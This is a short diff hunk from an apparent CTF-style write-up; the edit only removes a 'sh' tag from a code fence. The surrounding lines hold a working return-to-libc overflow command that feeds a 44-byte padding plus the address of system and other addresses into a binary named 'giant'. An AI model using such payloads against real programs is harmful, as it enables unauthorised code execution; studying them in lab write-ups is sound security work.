@@ -87,7 +87,7 @@ system : 0x40058ae0
 
 ### 0x02. Exploit
 
-```sh
+```
 ./giant "`python -c 'print "A"*44+"\x48\x9d\x0a\x40"+"\xe0\x8a\x05\x40"*2+"\xf9\xbf\x0f\x40"'`"
 ```
 
